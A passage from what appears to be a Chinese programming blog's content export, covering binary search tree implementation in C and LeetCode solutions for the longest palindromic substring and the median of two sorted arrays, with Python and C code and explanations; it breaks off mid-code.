<p>用数组形式去实现二叉搜索树的关键是使用下标寻找节点的父节点和孩子节点。</p>
<p>下面有两套映射规则：</p>
<blockquote>
<p><em>基于根节点为节点1，且数组从1开始的映射规则</em></p>
<p>​        节点N的父节点为节点N/2</p>
<p>​        节点N的左孩子节点为节点2N</p>
<p>​        节点N的右孩子节点为节点2N+1</p>
</blockquote>
<blockquote>
<p><em>基于根节点为节点0，且数组从0开始的映射规则</em></p>
<p>​        节点N的父节点为节点(N+1)/2 - 1</p>
<p>​        节点N的左孩子节点为节点2N+1</p>
<p>​        节点N的右孩子节点为节点2N+2</p>
</blockquote>
<p>上述两套规则都可以实现用数组来表示二叉搜索树</p>
<p>​        第一套可读性高，且符合现实习惯，但数组下标从1开始忽略了数组第一个元素的空间，在面对树中储存元素较大时浪费了空间。</p>
<p>​        在用数组实现二叉搜索树时，如何对未使用的数组元素初始化来表示该节点未使用也未赋值，用0表示也是一种方式，但0也是一个合法的数据值，这个时候就可以使用一个比较数组，它的元素是布尔类型，用于提示哪个节点被使用。</p>
<p>​        <strong>缺陷：无论是静态数组，还是动态数组来实现二叉搜索树，都会存在一个问题，那就是面对不是那么平衡树来说，往往会浪费很大的空间，而且每次的新插入会使数组大小扩大一倍，这样使可用空间迅速耗尽。</strong></p>
<h2 id="二叉搜索树的链式结构"><a href="#二叉搜索树的链式结构" class="headerlink" title="二叉搜索树的链式结构"></a>二叉搜索树的链式结构</h2><p>最为常见的二叉搜索树实现方式，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*使用动态分配的链式结构实现二叉搜索树</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tree.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*指向树根节点的指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">static</span> TreeNode *tree;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* insert</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">    TreeNode *current;</span><br><span class="line">    TreeNode **link = &amp;tree;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((current = *link) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(value &lt; current-&gt;value)</span><br><span class="line">            link = &amp;current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            assert(value != current-&gt;value);</span><br><span class="line">            link = &amp;current-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *分配一个新的节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    current = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(TreeNode));</span><br><span class="line">    assert(current != <span class="literal">NULL</span>);</span><br><span class="line">    current-&gt;value = value;</span><br><span class="line">    current-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">    current-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">    *link = current;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* find</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE *<span class="title">find</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">    TreeNode *current = tree;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span> &amp;&amp; current-&gt;value != value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(value &lt; current-&gt;value)</span><br><span class="line">            current = current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            current = current-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(current != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> &amp;current-&gt;value;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* max_tree</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE <span class="title">max_tree</span><span class="params">(TreeNode *link)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (link-&gt;right != <span class="literal">NULL</span>)</span><br><span class="line">        link = link-&gt;right;</span><br><span class="line">    <span class="keyword">return</span> link-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* remove</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_value</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">    TreeNode *current;</span><br><span class="line">    TreeNode **link = &amp;tree;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *寻找节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">while</span> ((current = *link)-&gt;value != value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (value &lt; current-&gt;value)</span><br><span class="line">            link = &amp;current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            assert(value != current-&gt;value);</span><br><span class="line">            link = &amp;current-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *删除节点，分三种情况</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span> &amp;&amp; current-&gt;right == <span class="literal">NULL</span>)</span><br><span class="line">       *link = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span> || current-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span>)</span><br><span class="line">            *link = current-&gt;right;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            *link = current-&gt;left;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        TREE_TYPE <span class="built_in">max</span> = max_tree(current-&gt;left);</span><br><span class="line">        remove_value(<span class="built_in">max</span>);<span class="comment">/*max必为叶节点*/</span></span><br><span class="line">        current-&gt;value = <span class="built_in">max</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* do_pre_order_traverse</span></span><br><span class="line"><span class="comment">* 执行一层前遍历序。这是一个辅助函数。</span></span><br><span class="line"><span class="comment">* 并不是用户接口</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_pre_order_traverse</span><span class="params">(TreeNode *current, <span class="keyword">void</span> (*callback)(TREE_TYPE value))</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        callback(current-&gt;value);</span><br><span class="line">        do_pre_order_traverse(current-&gt;left, callback);</span><br><span class="line">        do_pre_order_traverse(current-&gt;right, callback);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* pro_order_traverse</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pro_order_traverse</span><span class="params">(<span class="keyword">void</span> (*callback)(TREE_TYPE value))</span></span>&#123;</span><br><span class="line">    do_pre_order_traverse(tree, callback);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 测试使用pro_order_traverse(test_printf)，用于前序遍历输出树的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_printf</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    insert(<span class="number">2</span>);</span><br><span class="line">    insert(<span class="number">1</span>);</span><br><span class="line">    insert(<span class="number">3</span>);</span><br><span class="line">    remove_value(<span class="number">3</span>);</span><br><span class="line">    TREE_TYPE *k = <span class="built_in">find</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span>(k == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"not find\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"find %d\n"</span>, *k);</span><br><span class="line">    pro_order_traverse(test_printf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    insert(<span class="number">4</span>);</span><br><span class="line">    insert(<span class="number">0</span>);</span><br><span class="line">    insert(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tree maximum %d\n"</span>,max_tree(tree));</span><br><span class="line">    pro_order_traverse(test_printf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>link_tree.c文件</p>
<p>测试输出：</p>
<p><img src="https://s2.ax1x.com/2020/02/12/1HWDpt.png" alt="1HWDpt.png"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>二叉搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解5</title>
    <url>/2020/01/31/LeetCode%E9%A2%98%E8%A7%A35/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第5题，最长回文子串</strong></p>
<p>给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。</p>
<blockquote>
<p>示例 1：</p>
<p>输入: “babad”<br>输出: “bab”<br>注意: “aba” 也是一个有效答案。</p>
<p>示例 2：</p>
<p>输入: “cbbd”<br>输出: “bb”</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<h3 id="动态规划法："><a href="#动态规划法：" class="headerlink" title="动态规划法："></a>动态规划法：</h3><p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        n = len(s)</span><br><span class="line">        bl = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n)]<span class="keyword">for</span> i <span class="keyword">in</span> range(n)]</span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        end = n</span><br><span class="line">        <span class="keyword">for</span> leng <span class="keyword">in</span> range(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(n-leng+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> leng == <span class="number">1</span>:</span><br><span class="line">                    bl[i][i] = <span class="number">1</span></span><br><span class="line">                    start = i</span><br><span class="line">                    end = i + leng</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> (leng == <span class="number">2</span>) &amp; (s[i] == s[i + <span class="number">1</span>]):</span><br><span class="line">                    bl[i][i + <span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">                    start = i</span><br><span class="line">                    end = i + leng</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> (bl[i+<span class="number">1</span>][i+leng<span class="number">-2</span>] == <span class="number">1</span>) &amp; (s[i] == s[i+leng<span class="number">-1</span>]):</span><br><span class="line">                    bl[i][i+leng<span class="number">-1</span>] = <span class="number">1</span> </span><br><span class="line">                    start = i</span><br><span class="line">                    end = i + leng</span><br><span class="line">        <span class="keyword">return</span> s[start:end]</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/01/18NKRP.png" alt="18NKRP.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">longestPalindrome</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">bool</span> token[<span class="number">1000</span>][<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">//题目说明最大长度为1000</span></span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, <span class="built_in">end</span> = n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> len = <span class="number">1</span> ; len &lt;= n ; len++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= n -len ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">                token[i][i] = <span class="number">1</span>;</span><br><span class="line">                start = i;</span><br><span class="line">                <span class="built_in">end</span> = i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>((len == <span class="number">2</span>) &amp;&amp; (s[i] == s[i + <span class="number">1</span>]))&#123;</span><br><span class="line">                token[i][i+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">                start = i;</span><br><span class="line">                <span class="built_in">end</span> = i + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>((token[i+<span class="number">1</span>][i+len<span class="number">-2</span>] == <span class="number">1</span>) &amp;&amp; (s[i] == s[i+len<span class="number">-1</span>]))&#123;</span><br><span class="line">                token[i][i+len<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">                start = i;</span><br><span class="line">                <span class="built_in">end</span> = i + len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s[<span class="built_in">end</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> &amp;s[start];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/01/18tvVJ.png" alt="18tvVJ.png"></p>
<h3 id="中心扩散法："><a href="#中心扩散法：" class="headerlink" title="中心扩散法："></a>中心扩散法：</h3><p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getstr</span><span class="params">(self,s,left,right)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> left - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> right &lt; len(s):</span><br><span class="line">            <span class="keyword">if</span> s[left - <span class="number">1</span>] != s[right]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            left -= <span class="number">1</span></span><br><span class="line">            right += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> s[left:right] </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        n = len(s)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            l = self.getstr(s,i,i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> len(l) &gt;= len(result):</span><br><span class="line">                result = l</span><br><span class="line">            <span class="keyword">if</span> i != n<span class="number">-1</span> <span class="keyword">and</span> s[i] == s[i+<span class="number">1</span>] :</span><br><span class="line">                l = self.getstr(s,i,i+<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">if</span> len(l) &gt;= len(result):</span><br><span class="line">                    result = l          </span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/04/10bXpq.png" alt="10bXpq.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">longestPalindrome</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">strlen</span>(s), start = <span class="number">0</span>, <span class="built_in">end</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123; <span class="comment">//奇数</span></span><br><span class="line">        <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">            left--;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">            start = left + <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">end</span> = right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)&#123; <span class="comment">//偶数</span></span><br><span class="line">        <span class="keyword">if</span>(s[i] == s[i + <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">                left--;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">                start = left + <span class="number">1</span>;</span><br><span class="line">                <span class="built_in">end</span> = right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    s[<span class="built_in">end</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> &amp;s[start];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/03/1NYoZT.png" alt="1NYoZT.png"></p>
<h3 id="解析："><a href="#解析：" class="headerlink" title="解析："></a>解析：</h3><p>​    <strong>无论是动态规划法还是中心扩散法，理论上他们的时间复杂度都应该是O(n^2)​。</strong></p>
<h4 id="关于动态规划："><a href="#关于动态规划：" class="headerlink" title="关于动态规划："></a>关于动态规划：</h4><p>是有一个二维布尔数组<code>bool_list[i][j]</code>，若值为1，则表示字符串中 i 位到 j 位构成回文子串。</p>
<p>动态规划中首先遍历长度leng，每次再遍历字符串，观察是否具有长度为leng的回文子串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> len = <span class="number">1</span> ; len &lt;= n ; len++) <span class="comment">//leng从1开始</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= n -len ; i++) <span class="comment">//每次遍历到字符串的n-leng位</span></span><br></pre></td></tr></table></figure>

<p>其中<code>boollist[i][j]</code>,若<code>i = j</code>，则恒为1，因为字符串始终具有长度为1的回文子串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">    token[i][i] = <span class="number">1</span>;</span><br><span class="line">    start = i;</span><br><span class="line">    <span class="built_in">end</span> = i + <span class="number">1</span>;</span><br><span class="line">   	<span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时回文子串也有奇数和偶数之分，奇数的回文字串中心为一个字符，而偶数的回文子串中心是两个相同的字符。所以当leng为2时要考虑偶数回文子串：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((len == <span class="number">2</span>) &amp;&amp; (s[i] == s[i + <span class="number">1</span>]))&#123;</span><br><span class="line">    token[i][i+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">	start = i;</span><br><span class="line"> 	<span class="built_in">end</span> = i + <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>剩下就可以通解了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((token[i+<span class="number">1</span>][i+len<span class="number">-2</span>] == <span class="number">1</span>) &amp;&amp; (s[i] == s[i+len<span class="number">-1</span>]))&#123;</span><br><span class="line">    token[i][i+len<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">    start = i;</span><br><span class="line">    <span class="built_in">end</span> = i + len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为一个回文子串所具有的性质就是，每个元素和它的对称位置元素相同，且它俩中间包裹的子串也肯定时回文子串。</p>
<h4 id="关于中心扩散："><a href="#关于中心扩散：" class="headerlink" title="关于中心扩散："></a>关于中心扩散：</h4><p>其实，我们也可以这样找回文：</p>
<p>​    遍历字符串每个元素，从每个元素出发，查看它两边的元素是否相等，相等则查看更外层两边元素是否相等，如此重复，直到不相等，则返回找到的奇数回文子串：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123; <span class="comment">//奇数</span></span><br><span class="line">    <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">        left--;</span><br><span class="line">        right++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">        start = left + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">end</span> = right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    而偶数回文子串的寻找，和上述相似，只不过在最开始的中心元素是两个相等的元素，或者说是一条线为中心开始，向两边扩散：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)&#123; <span class="comment">//偶数</span></span><br><span class="line">    <span class="keyword">if</span>(s[i] == s[i + <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">            left--;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">            start = left + <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">end</span> = right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意：要找到最大回文子串的话，可以在找到回文子串时和之前找到的最大回文子串长度比较，若大于则更新，若小于则不变。</strong></p>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解4</title>
    <url>/2020/01/30/LeetCode%E9%A2%98%E8%A7%A34/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第4题，寻找两个有序数组的中位数</strong></p>
<p>给定两个大小为 m 和 n 的有序数组 nums1 和 nums2。</p>
<p>请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为 <strong>O(log(m + n))</strong>。</p>
<p>你可以假设 nums1 和 nums2 不会同时为空。</p>
<blockquote>
<p>示例 1:</p>
<p>nums1 = [1, 3]<br>nums2 = [2]</p>
<p>则中位数是 2.0</p>
<p>示例 2:</p>
<p>nums1 = [1, 2]<br>nums2 = [3, 4]</p>
<p>则中位数是 (2 + 3)/2 = 2.5</p>
</blockquote>
<a id="more"></a>

<p>原题如上，解法如下：</p>
<p><strong>python版</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getk</span><span class="params">(self,nums1,start1,nums2,start2,n)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> start1 &gt;= len(nums1):</span><br><span class="line">            <span class="keyword">return</span> nums2[start2 + n - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> start2 &gt;= len(nums2):</span><br><span class="line">            <span class="keyword">return</span> nums1[start1 + n - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> min(nums1[start1],nums2[start2])</span><br><span class="line">        half = min(int(n/<span class="number">2</span>),min(len(nums1)-start1,len(nums2)-start2))</span><br><span class="line">        <span class="keyword">if</span> nums1[start1 + half - <span class="number">1</span>] &lt; nums2[start2 + half - <span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> self.getk(nums1, start1 + half, nums2, start2, n - half)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.getk(nums1, start1 , nums2, start2 + half, n - half)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMedianSortedArrays</span><span class="params">(self, nums1, nums2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums1: List[int]</span></span><br><span class="line"><span class="string">        :type nums2: List[int]</span></span><br><span class="line"><span class="string">        :rtype: float</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        left = int((len(nums1)+len(nums2)+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">        right = int((len(nums1)+len(nums2)+<span class="number">2</span>)/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> (self.getk(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,left) + self.getk(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,right))*<span class="number">0.5</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/30/1Qz3E8.png" alt="1Qz3E8.png"></p>
<p><strong>c语言版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a &gt; b)&#123;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getk</span><span class="params">(<span class="keyword">int</span>* nums1, <span class="keyword">int</span> nums1Size, <span class="keyword">int</span> start1, <span class="keyword">int</span>* nums2, <span class="keyword">int</span> nums2Size, <span class="keyword">int</span> start2, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(start1 &gt;= nums1Size)</span><br><span class="line">        <span class="keyword">return</span> nums2[start2 + n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(start2 &gt;= nums2Size)</span><br><span class="line">        <span class="keyword">return</span> nums1[start1 + n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span 